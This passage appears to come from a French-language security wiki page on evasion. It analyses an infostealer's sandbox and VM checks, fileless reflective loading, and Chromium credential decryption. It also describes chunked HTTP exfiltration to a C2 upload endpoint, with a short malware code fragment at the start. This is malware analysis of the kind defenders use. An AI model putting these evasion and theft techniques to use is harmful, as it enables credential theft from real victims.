CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
ExitProcess(0);
}
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```
### Logique en couches de `check_antivm`

- Variant A parcourt la liste des processus, hash chaque nom avec un checksum roulant personnalisé, et le compare aux blocklists embarquées pour debuggers/sandboxes ; il répète le checksum sur le nom de l'ordinateur et vérifie des répertoires de travail tels que `C:\analysis`.
- Variant B inspecte les propriétés système (seuil minimal du nombre de processus, uptime récent), appelle `OpenServiceA("VBoxGuest")` pour détecter les additions VirtualBox, et effectue des vérifications de timing autour des sleeps pour repérer le single-stepping. Toute détection annule l'exécution avant le lancement des modules.

### Fileless helper + double ChaCha20 reflective loading

- Le DLL/EXE principal intègre un Chromium credential helper qui est soit déposé sur le disque soit mappé manuellement en mémoire ; en mode fileless, il résout lui-même les imports/relocations de sorte qu'aucun artefact du helper n'est écrit.
- Ce helper stocke une DLL de second stade chiffrée deux fois avec ChaCha20 (deux clés de 32 octets + nonces de 12 octets). Après les deux passes, il reflectively loads le blob (pas de `LoadLibrary`) et appelle les exports `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` dérivés de [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).
- Les routines ChromElevator utilisent direct-syscall reflective process hollowing pour injecter dans un Chromium en cours d'exécution, hériter des clés AppBound Encryption, et déchiffrer mots de passe/cookies/cartes de crédit directement depuis les bases SQLite malgré le hardening ABE.

### Collecte modulaire en mémoire & exfiltration HTTP par morceaux

- `create_memory_based_log` parcourt une table globale de pointeurs de fonction `memory_generators` et crée un thread par module activé (Telegram, Discord, Steam, screenshots, documents, browser extensions, etc.). Chaque thread écrit les résultats dans des buffers partagés et rapporte son nombre de fichiers après une fenêtre de jointure d'environ 45s.
- Une fois terminé, tout est zippé avec la librairie statiquement liée `miniz` en `%TEMP%\\Log.zip`. `ThreadPayload1` dort ensuite 15s et envoie l'archive en morceaux de 10 MB via HTTP POST vers `http://<C2>:6767/upload`, usurpant une boundary `multipart/form-data` de navigateur (`----WebKitFormBoundary***`). Chaque morceau ajoute `User-Agent: upload`, `auth: <build_id>`, optionnel `w: <campaign_tag>`, et le dernier morceau ajoute `complete: true` pour que le C2 sache que le réassemblage est terminé.

## References

- [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)

- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)

- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [Rapid7 – SantaStealer is Coming to Town: A New, Ambitious Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [Check Point Research – GachiLoader: Defeating Node.js Malware with API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)

{{#include ../banners/hacktricks-training.md}}
